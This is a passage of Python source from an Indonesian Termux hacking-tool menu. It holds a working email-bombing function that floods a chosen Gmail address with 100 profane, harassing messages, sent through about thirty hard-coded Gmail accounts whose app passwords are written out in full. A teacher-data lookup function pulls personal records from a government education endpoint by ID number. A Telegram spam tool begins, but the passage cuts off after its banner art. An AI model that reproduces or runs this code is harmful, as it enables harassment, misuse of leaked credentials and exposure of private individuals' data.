⠀⠀⠘⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀
⢀⠀⠀⠀⠘⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⢀⡀
⢸⣧⣄⠀⠀⠀⠘⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⢀⣴⣿⡂
⢺⣿⣿⣷⣄⠀⠀⠀⠉⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠃⠀⠀⢀⣴⣿⣿⣿⠅
⢸⣿⣿⣿⣿⣷⡄⠀⠀⠀⠙⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⢀⣴⣿⣿⣿⣿⣿⡅
⢹⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠉⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⡂
⣸⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠙⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⠅
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣄⠀⠀⠀⠉⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠃⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡅
⢼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢄⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀⣰⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡂
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠃⠀⠀⠀⡀⠀⠈⠹⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠆
⢺⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⣤⣿⣷⣀⠀⠀⠀⠘⠿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⣤⣿⣶⣄⠀⠀⠈⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡅
⢸⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⣤⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠉⠉⠉⠉⠀⠀⠀⢀⣔⣿⣿⣿⣿⣿⣷⣀⠀⠀⠀⠛⣿⣿⣿⣿⣿⣿⣿⣿⡂
⢹⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⡀⠀⠀⠀⠀⠀⠀⡀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠻⢿⣿⣿⣿⣿⣿⠅
⣸⣿⣿⣿⡿⠋⠀⠀⠀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣶⣴⣴⣶⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠈⠹⢿⣿⣿⣿⡃
⢸⣿⡿⠋⠀⠀⠀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠈⠹⢿⣿⠂
⠀⠋⠀⠀⠀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠈⠉⠀
⠀⠀⠀⠠⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠷⠀⠀⠀⠀
"""
    os.system(f'echo "{ascii_gmail}" | lolcat 2>/dev/null || echo "{ascii_gmail}"')

    print(f"""
{W}╭─────────────────────────────────────────────────────────────────╮
{W}│ {W}Tools {R}: {G}Spam Email {R} │ {W}Developer {R}: {G}Rullzzz06
{W}╰─────────────────────────────────────────────────────────────────╯
{W}╭─────────────────────────────────────────────────────────────────╮
{W}│ Masukkan Email Target contoh{R}:{W} Ngentod123@gmail.com
{W}╰─────────────────────────────────────────────────────────────────╯{N}""")

    def get_senders():
        return [
            {'email': 'termuxmikasa@gmail.com', 'app_password': 'jrpi ejvt rfte kuxd'},
            {'email': 'tt0861230@gmail.com', 'app_password': 'gtdy mllp rvft fdzt'},
            {'email': 'spamreportuntukproyek@gmail.com', 'app_password': 'rcjb wtpf cpmb zqmc'},
            {'email': 'ya2771326@gmail.com', 'app_password': 'bpex yhmi ymmm mzrt'},
            {'email': 'anonimousee909@gmail.com', 'app_password': 'vwsz udcr zwtn nddt'},
            {'email': 'anonimouse90909@gmail.com', 'app_password': 'hhgl fmji jsae sqxu'},
            {'email': 'anonimouse9099@gmail.com', 'app_password': 'qpss riuo pkjk tmeg'},
            {'email': 'anonimouse90999@gmail.com', 'app_password': 'ijrf hhuo jpml iysc'},
            {'email': 'aaabaaah2@gmail.com', 'app_password': 'oqtx elxg cefv dgvd'},
            {'email': 'anjaynathan399@gmail.com', 'app_password': 'cpil kwkt llab sodh'},
            {'email': 'joeellan26@gmail.com', 'app_password': 'wnfe iboi ktrr uder'},
            {'email': 'bayarutangllu@gmail.com', 'app_password': 'cbty vvaf rncu oawg'},
            {'email': 'asepanjang121@gmail.com', 'app_password': 'yidj nlkm irci yluy'},
            {'email': 'testimonialyayaya@gmail.com', 'app_password': 'mtkq kpaf gtjp zgbn'},
            {'email': 'buljem885@gmail.com', 'app_password': 'maug wpoh hddc uthh'},
            {'email': 'rahmanianabila75@gmail.com', 'app_password': 'elyn sgyr qqyx gxhi'},
            {'email': 'gufronjah@gmail.com', 'app_password': 'ulzr gfgd fhuj fahh'},
            {'email': 'dyantisukiem@gmail.com', 'app_password': 'zprf qelo tzqp wyac'},
            {'email': 'hilaryartasia@gmail.com', 'app_password': 'dscu jgry ikof ldcg'},
            {'email': 'satriaasiapayaaa@gmail.com', 'app_password': 'yzey ztnh apak xeva'},
            {'email': 'divikvidik@gmail.com', 'app_password': 'enkt cpcw beom ggey'},
            {'email': 'daemoniumuser@gmail.com', 'app_password': 'wgas iris atyy xpnc'},
            {'email': 'auto.send583@gmail.com', 'app_password': 'awlg kpsu rszi fppt'},
            {'email': 'cindyfiolita9@gmail.com', 'app_password': 'kpvu treo hfar zqdy'},
            {'email': 'gstorekonter4@gmail.com', 'app_password': 'xwdq ugie fbzw xeaa'},
            {'email': 'anonymousgalirus@gmail.com', 'app_password': 'ltnc fedd qzsy lfwu'},
            {'email': 'heckedbyx1@gmail.com', 'app_password': 'ibdf ukbz ugqd fqwu'},
            {'email': '0Anonymusy1@gmail.com', 'app_password': 'fvin nkbd tcrv wakf'},
            {'email': 'v8728799@gmail.com', 'app_password': 'wjng geyu qrjb qrkz'},
            {'email': 'malzoffcial5009@gmail.com', 'app_password': 'iebj mqgx xjuk wfs'},
            {'email': 'sonin.spd01@gmail.com', 'app_password': 'fkpp cyay qfdb syll'},
        ]

    SUBJECTS = [
        "Tai lu",
        "Bacot asu",
        "goblk Anj",
        "Kontol Bapak lu bsr banget😹",
        "Bacot ajg Spam Bot",
        "ngentod yu",
        "Kek tai anj😹",
        "Apalah anj😹",
        "Test Message",
        "Spam Attack",
        "Gmail Flooder",
        "Termux Spam",
        "Auto Generated",
        "Belajar lagi dek ngamanin akun😹",
        "Bpaalu ambatukam wkwk😹",
        "Please Ignore",
        "Spam Email",
        "Bacot Ajg",
        "Bacot lu bangsat",
        "bgst Anj",
        "Bgst 😹",
        "Ngenotd Security",
        "Panik ya dek?😹",
        "Anonymous Email",
        "Panik ya?😹"
    ]

    def load_bar(stop_event, text="Processing"):
        COLORS = ['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m']
        RESET = '\x1b[0m'
        length = 15
        color_index = 0
        while not stop_event.is_set():
            for i in range(length + 1):
                if stop_event.is_set():
                    break
                filled_color = COLORS[color_index % len(COLORS)] + '■' * i + RESET
                empty = '□' * (length - i)
                sys.stdout.write(f'\r [ {G}✦{W} ] {text} [[{filled_color}{empty}{W}]]')
                sys.stdout.flush()
                time.sleep(0.05)
                color_index += 1
        sys.stdout.write('\r' + ' ' * 120 + '\r')
        sys.stdout.flush()

    def validasi_email(email):
        pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        return re.match(pattern, email) is not None

    def kirim_email(sender, target, subject, message):
        try:
            msg = MIMEMultipart()
            msg['From'] = sender['email']
            msg['To'] = target
            msg['Subject'] = subject
            msg.attach(MIMEText(message, 'plain'))

            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(sender['email'], sender['app_password'])
            server.sendmail(sender['email'], target, msg.as_string())
            server.quit()
            return True
        except:
            return False

    target = input(f"{U}❯❯❯{W} Masukkan Gmail Target{G}❯{W} ").strip()

    if not target:
        print(f"{W}[ {R}??{W} ] Email target tidak boleh kosong!{N}")
        input(f"{W}Tekan {R}Enter{W} untuk kembali...{N}")
        return

    if not validasi_email(target):
        print(f"{W}[ {R}??{W} ] Format email tidak valid!{N}")
        input(f"{W}Tekan Enter untuk kembali...{N}")
        return

    print(f"\n{W}╭─────────────────────────────────────────────────────────────────╮{N}")
    print(f"{W}│ Silahkan Masukkan {G}Pesan{W} yang dikirim Ke Target")
    print(f"{W}╰─────────────────────────────────────────────────────────────────╯{N}")

    custom_message = input(f"{U}❯❯❯{W} Masukkan Pesan{G}❯{W} ").strip()
    if not custom_message:
        print(f"\n{W}[ {R}??{W} ] Pesan kosong, Memakai pesan default!{N}")
        messages = ["Ngentod Lu asu kontol ngentod nene lu hitam Bangsat😹"]
    else:
        messages = [custom_message]

    print(f"\n{W}╭─────────────────────────────────────────────────────────────────╮")
    print(f"{W}│ {W}Target {R}: {W}{target}{N}")
    print(f"{W}╰─────────────────────────────────────────────────────────────────╯")

    confirm = input(f"{U}❯❯❯ {W}Mulai spam? ({G}y{U}/{R}n{W}){R}: {N}").strip().lower()
    if confirm != 'y':
        print(f"{W}[ {R}!{W} ] Dibatalkan{N}")
        input(f"{W}Tekan {R}Enter{W} untuk kembali...{N}")
        return

    senders = get_senders()
    if not senders:
        print(f"{W}[ {R}??{W} ] Tidak ada Sender Yang active{N}")
        input(f"{W}Tekan {R}Enter{W} Untuk kembali...{N}")
        return

    jumlah = 100
    threads = 10

    print()

    stop_loading = threading.Event()
    loading_thread = threading.Thread(target=load_bar, args=(stop_loading, "Mengirim Spam Gmail"))
    loading_thread.daemon = True
    loading_thread.start()

    def worker(task_num):
        sender = random.choice(senders)
        subject = random.choice(SUBJECTS)
        message = random.choice(messages)
        kirim_email(sender, target, subject, message)

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(worker, i) for i in range(1, jumlah + 1)]
        for future in as_completed(futures):
            future.result()

    stop_loading.set()
    loading_thread.join()

    print(f"\n{W}╭─────────────────────────────────────────────────────────────────╮")
    print(f"{W}│ {G}✓{W} Spam Gmail Selesai!{N}")
    print(f"{W}╰─────────────────────────────────────────────────────────────────╯")

    input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")

def tool_gtk_checker():
    play_menu_sound()
    pantau_aktivitas()
    import os, sys, time, json, requests, threading, re

    os.system('clear')

    R = '\033[91m'
    G = '\033[92m'
    Y = '\033[93m'
    W = '\033[97m'
    C = '\033[96m'
    N = '\033[0m'

    ascii_gtk = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢀⣀⣀⣄⣄⣠⣀⣀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣶⣿⣿⢿⠿⠿⠿⠿⠿⠿⠿⣿⣿⣶⣦⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⣿⠿⠛⠉⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡟⠋⠀⡀⣄⣦⣾⡿⠁⢀⣴⣿⣿⣦⡀⠈⢻⣷⣦⣤⢀⠀⠙⢻⣿⣧⡄⢀⠀⢀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⡟⠃⠀⣠⣾⣾⣿⣿⣿⠁⠀⣾⣿⣿⣿⣿⣷⡀⠈⣻⣿⣿⣿⣶⣄⠀⠈⠿⣿⣿⣿⢿⢿⣿⣷⣧⣦⡀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⠋⠀⠀⠘⠛⠿⣿⣿⣿⠇⠀⣸⣿⣿⣿⣿⣿⣿⡧⠀⠨⣿⣿⡿⠟⠏⠃⠀⠀⠙⣿⣷⡄⠁⠀⠈⠙⢿⣿⡀
⠀⠀⠀⠀⠀⠀⠀⣾⣿⠃⠀⣰⣷⣦⣄⣀⠀⠈⠊⠀⠀⠛⠛⠛⠛⠛⠛⠛⠛⠀⠀⠁⠁⢀⢠⣠⣶⣾⣆⠀⠘⢿⣷⡀⠀⠀⣠⣿⡿⠀
⠀⠀⠀⠀⠀⠀⣼⣿⠇⠀⣰⣿⣿⣿⣿⣿⣿⣷⡆⠀⢠⣦⣤⣤⣤⣤⣤⣤⣦⡆⠀⢰⣿⣿⣿⣿⣿⣿⣿⡥⠀⠩⣿⣷⣠⣺⣾⠟⠀⠀
⠀⠀⠀⠀⠀⠠⣿⡿⠀⠠⣾⣿⣿⣿⣿⣿⣿⣿⠅⠀⢽⣿⣿⣿⣿⣿⣿⣿⣿⣯⠀⠐⣿⣿⣿⣿⣿⣿⣿⣿⡄⣀⣽⣿⡿⠟⠁⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⡇⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⡁⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠐⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⠟⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣀⣾⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⣾⡿⠟⠉⠀⢠⣴⡯⠀⠀⠀⠀⠀
⠀⠀⣠⣾⣿⢿⣿⡇⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⡂⠀⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣠⣴⣿⣿⡿⠟⠛⠉⢀⣠⡆⠀⢰⣿⡏⠀⠀⠀⠀⠀
⠀⣴⣿⠟⠀⠐⣿⣟⡀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⢺⣿⣿⣿⣿⣿⣿⣿⣿⡿⡟⠏⠋⠀⣀⣤⣶⣾⣿⣿⠁⠀⣺⣿⠇⠀⠀⠀⠀⠀
⢐⣿⣟⠀⠀⠀⢽⣿⣆⠀⠘⣿⣿⣿⣿⣿⣿⣿⣧⣤⣾⣿⣿⡿⡿⠟⠛⠉⠈⠀⠀⠠⢶⣿⣿⣿⣿⣿⣿⠇⠁⢰⣿⡟⠀⠀⠀⠀⠀⠀
⠀⠹⢿⣿⣶⣦⣦⣿⣿⣦⣶⣽⣿⣿⣿⡿⡿⠿⠻⠫⠋⠃⠁⡀⣄⣤⣦⣦⣦⠀⠀⣀⡀⠀⠁⠋⠻⡻⡓⠀⢠⣿⡿⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠈⠋⠋⠛⠙⠙⠙⠉⠉⠈⡀⣈⣀⣄⣤⣂⠀⠸⣿⣿⣿⣿⣿⣿⡏⠀⢐⣿⣿⣿⣶⣦⡀⠀⠀⣰⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣾⣶⣄⠀⠘⠻⣿⣿⣿⣷⡄⠀⢻⣿⣿⣿⣿⡿⠀⢀⣿⣿⣿⣿⠟⠃⠀⣠⣾⡿⠏⠂⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣷⣤⡀⠀⠉⠻⢻⢷⣀⠀⠻⢿⡿⠟⠀⢀⡾⠿⠛⠍⠂⢀⣰⣼⣿⠯⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣿⣶⣦⣄⡀⡀⠀⠀⠀⠀⠈⠀⠀⠀⠈⣀⣠⣤⣶⣿⠿⠫⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠿⡿⣿⣷⣷⣶⣶⣶⣶⣶⣿⣿⡷⡿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
    os.system(f'echo "{ascii_gtk}" | lolcat 2>/dev/null || echo "{ascii_gtk}"')

    print(f"""
{W}╭─────────────────────────────────────────────────────────────────╮
{W}│ {W}Tools {R}: {G}Cek Data Guru{R} │ {W}Developer {R}: {G}Rullzzz06
{W}╰─────────────────────────────────────────────────────────────────╯
{W}╭─────────────────────────────────────────────────────────────────╮
{W}│ Masukkan {G}NIK{W} atau {G}NUPTK{W} Untuk mencari data guru
{W}╰─────────────────────────────────────────────────────────────────╯{N}""")

    keyword = input(f"{U}❯❯❯ {W}Masukkan Nik {R}/{W} PTK{G}❯{W} ").strip()

    if not keyword:
        print(f"{W}[ {R}??{W} ] Keyword tidak boleh kosong!{N}")
        input(f"{W}Tekan Enter untuk kembali...{N}")
        return

    def load_bar(stop_event):
        COLORS = ['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m']
        RESET = '\x1b[0m'
        length = 15
        color_index = 0
        while not stop_event.is_set():
            for i in range(length + 1):
                if stop_event.is_set():
                    break
                filled_color = COLORS[color_index % len(COLORS)] + '■' * i + RESET
                empty = '□' * (length - i)
                sys.stdout.write(f'\r [ {G}✦{W} ] Mencari Data Guru [[{filled_color}{empty}{W}]]')
                sys.stdout.flush()
                time.sleep(0.05)
                color_index += 1
        sys.stdout.write('\r' + ' ' * 120 + '\r')
        sys.stdout.flush()

    stop_loading = threading.Event()
    t = threading.Thread(target=load_bar, args=(stop_loading,))
    t.daemon = True
    t.start()

    time.sleep(1.5)

    try:
        url = f"https://gtk.belajar.kemendikdasmen.go.id/akun/ptk-solr?keyword={keyword}"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json'
        }

        response = requests.get(url, headers=headers, timeout=15)
        stop_loading.set()
        t.join()

        if response.status_code != 200:
            print(f"\n{W}╭─────────────────────────────────────────────────────────────────╮")
            print(f"{W}│ {R}✗{W} Gagal mengambil data! Status: {response.status_code}{N}")
            print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
            input(f"{U}❯❯❯ {W}Tekan Enter untuk kembali{N}")
            return

        data = response.json()

        if not data or 'data' not in data or len(data['data']) == 0:
            print(f"\n{W}╭─────────────────────────────────────────────────────────────────╮")
            print(f"{W}│ {R}✗{W} Data tidak ditemukan untuk keyword {R}{keyword}{N}")
            print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
            input(f"{U}❯❯❯ {W}Tekan Enter untuk kembali{N}")
            return

        guru = data['data'][0]

        nama = guru.get('nama', 'Tidak Diketahui')
        nuptk = guru.get('nuptk', 'Tidak Diketahui')
        ptk_id = guru.get('ptk_id', 'Tidak Diketahui')
        nik_masked = guru.get('nik_masked', 'Tidak Diketahui')

        status_ptk = 'Tidak Diketahui'
        if guru.get('status_ptk'):
            status_ptk = guru['status_ptk'].get('aktif', 'Tidak Diketahui')

        sekolah = 'Tidak Diketahui'
        if guru.get('sekolah'):
            sekolah = guru['sekolah'].get('nama', 'Tidak Diketahui')

        status_pegawai = 'Tidak Diketahui'
        if guru.get('m_pegawai'):
            status_pegawai = guru['m_pegawai'].get('keterangan', 'Tidak Diketahui')

        jenis_ptk = 'Tidak Diketahui'
        if guru.get('m_jenis_ptk'):
            jenis_ptk = guru['m_jenis_ptk'].get('jenis_ptk', 'Tidak Diketahui')

        provinsi = 'Tidak Diketahui'
        kota = 'Tidak Diketahui'
        if guru.get('sekolah'):
            if guru['sekolah'].get('m_propinsi'):
                provinsi = guru['sekolah']['m_propinsi'].get('keterangan', 'Tidak Diketahui')
            if guru['sekolah'].get('m_kota'):
                kota = guru['sekolah']['m_kota'].get('keterangan', 'Tidak Diketahui')

        wkt_sinkron = guru.get('wkt_sinkron', 'Tidak Diketahui')
        wkt_terbit = guru.get('wkt_terbit_akun', 'Tidak Diketahui')

        print(f"\n{W}╭─────────────────────────────────────────────────────────────────╮")
        print(f"{W}│ {G}✓{W} Data Guru Ditemukan{N}")
        print(f"{W}├─────────────────────────────────────────────────────────────────┤")
        print(f"{W}│ {W}Nama Lengkap   {R}: {G}{nama}{N}")
        print(f"{W}│ {W}NUPTK          {R}: {G}{nuptk}{N}")
        print(f"{W}│ {W}PTK ID         {R}: {G}{ptk_id}{N}")
        print(f"{W}│ {W}NIK (masked)   {R}: {G}{nik_masked}{N}")
        print(f"{W}│ {W}Sekolah        {R}: {G}{sekolah}{N}")
        print(f"{W}│ {W}Provinsi       {R}: {G}{provinsi}{N}")
        print(f"{W}│ {W}Kab/Kota       {R}: {G}{kota}{N}")
        print(f"{W}│ {W}Status PTK     {R}: {G}{status_ptk}{N}")
        print(f"{W}│ {W}Jenis PTK      {R}: {G}{jenis_ptk}{N}")
        print(f"{W}│ {W}Status Pegawaib{R}: {G}{status_pegawai}{N}")
        print(f"{W}│ {W}Waktu Sinkron  {R}: {G}{wkt_sinkron}{N}")
        print(f"{W}│ {W}Terbit Akun    {R}: {G}{wkt_terbit}{N}")
        print(f"{W}╰─────────────────────────────────────────────────────────────────╯")

    except requests.exceptions.Timeout:
        stop_loading.set()
        t.join()
        print(f"{W}[ {R}??{W} ] Timeout! Server tidak merespons.{N}")
    except requests.exceptions.ConnectionError:
        stop_loading.set()
        t.join()
        print(f"{W}[ {R}??{W} ] Gagal terhubung ke server!{N}")
    except Exception as e:
        stop_loading.set()
        t.join()
        print(f"\n{R}✗ Error: {e}{N}")

    input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")

def tool_telegram_spam():
    play_menu_sound()
    pantau_aktivitas()
    import os, sys, time, json, requests, threading, random
    from concurrent.futures import ThreadPoolExecutor, as_completed

    os.system('clear')

    ascii_tele = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣤⣤⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀
⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀
⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀
⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠋⠉⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀
⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠉⠁⠀⠀⢀⣠⠄⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀
⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠉⠁⠀⠀⠀⠀⢀⣤⡶⠟⠁⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⣀⣤⣾⡿⠋⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣀⡀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣾⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣤⣤⣴⣾⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀
⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀
